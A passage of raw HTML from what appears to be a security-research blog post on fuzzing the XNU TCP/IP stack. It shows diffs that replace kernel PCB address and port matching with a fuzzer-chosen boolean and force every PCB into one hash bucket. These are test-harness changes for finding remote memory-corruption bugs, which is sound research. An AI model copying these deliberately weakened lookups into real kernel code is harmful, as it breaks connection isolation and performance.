class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;in6_pcblookup_hash&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;tcbinfo&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;ip6&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ip6_src&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;th_sport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;ip6&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ip6_dst&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;th_dport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; m&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;m_pkthdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;rcvif&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;else&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#endif&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* INET6 */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; inp &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;in_pcblookup_hash&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;tcbinfo&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ip_src&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;th_sport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ip_dst&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;th_dport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;m&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;m_pkthdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;rcvif&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Here&amp;rsquo;s the IPv4 lookup code. Note that &lt;/span&gt;&lt;span class="c9"&gt;faddr&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c9"&gt;fport_arg&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c9"&gt;laddr&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class="c9"&gt;lport_arg&lt;/span&gt;&lt;span&gt;&amp;nbsp;are all taken directly from the packet and are checked against the list of PCBs, one at a time. This means that we must guess two 4-byte integers and two 2-byte shorts to match the packet to the relevant PCB. Even coverage-guided fuzzing is going to have a hard time guessing its way through these comparisons. While eventually a match will be found, we can radically improve the odds of covering meaningful code by just flipping a coin instead of doing the comparisons. This change is extremely easy to make, as we can fetch a random boolean from the fuzzer at runtime. Looking up existing PCBs and fixing up the IP/TCP headers before sending the packets is a sounder solution, but in my testing this change didn&amp;rsquo;t introduce any regressions. Now when a vulnerability is discovered, it&amp;rsquo;s just a matter of fixing up headers to match packets to the appropriate PCB. That&amp;rsquo;s light work for a vulnerability researcher looking for a remote memory corruption bug.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.927b886dd5a32d7f9b647faf078857d678f6d1bf"&gt;&lt;/a&gt;&lt;a id="t.27"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;&amp;nbsp;* Lookup PCB in hash list.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;inpcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;in_pcblookup_hash&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;inpcbinfo &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;pcbinfo&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;in_addr faddr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; u_int fport_arg&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;in_addr laddr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;u_int lport_arg&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;wildcard&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ifnet &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;ifp&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;// ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; head &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;pcbinfo&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ipi_hashbase&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c0"&gt;INP_PCBHASH&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;faddr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;s_addr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;lport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pcbinfo&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ipi_hashmask&lt;/span&gt;&lt;span class="c1"&gt;)];&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; LIST_FOREACH&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;inp&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;head&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;inp_hash&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;inp&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;inp_faddr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;s_addr &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;faddr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;s_addr &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; inp&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;inp_laddr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;s_addr &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;laddr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;s_addr &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; inp&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;inp_fport &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fport &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; inp&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;inp_lport &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;lport&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c0"&gt;get_fuzzed_bool&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;in_pcb_checkstate&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;inp&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;WNT_ACQUIRE&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; WNT_STOPUSING&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; lck_rw_done&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;pcbinfo&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;ipi_lock&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;inp&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;&lt;br&gt;Astute readers may have noticed that the PCBs are fetched from a hash table, so it&amp;rsquo;s not enough just to replace the check. The 4 values used in the linear search are used to calculate a PCB hash, so we have to make sure all PCBs share a single bucket, as seen in the diff below. The real kernel shouldn&amp;rsquo;t do this as lookups become O(n), but we only create a few sockets, so it&amp;rsquo;s acceptable.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.ff85c5d49936d74a427dd2c77dc5b4f6949346c9"&gt;&lt;/a&gt;&lt;a id="t.28"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;diff &lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;&lt;span class="c0"&gt;git a&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;netinet&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;in_pcb&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;h b&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;netinet&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;in_pcb&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;h&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;index a5ec42ab&lt;/span&gt;&lt;span class="c1"&gt;..&lt;/span&gt;&lt;span class="c3"&gt;37f6ee50&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;100644&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;---&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;netinet&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;in_pcb&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;h&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;+++&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;netinet&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;in_pcb&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;h&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;611&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;10&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c3"&gt;611&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;9&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;@@&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;inpcbinfo &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u_int32_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipi_flags&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c17"&gt;#define&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;INP_PCBHASH&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;faddr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;lport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mask&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;\&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(((&lt;/span&gt;&lt;span class="c0"&gt;faddr&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;^&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;faddr&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;16&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;^&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ntohs&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;lport&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;^&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;fport&lt;/span&gt;&lt;span class="c1"&gt;)))&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;mask&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c17"&gt;#define&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;INP_PCBPORTHASH&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;lport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mask&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;\&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;ntohs&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;lport&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;mask&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c17"&gt;// nedwill: let all pcbs share the same hash&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c17"&gt;#define&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; INP_PCBHASH&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;faddr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;lport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mask&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c17"&gt;#define&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; INP_PCBPORTHASH&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;lport&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mask&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 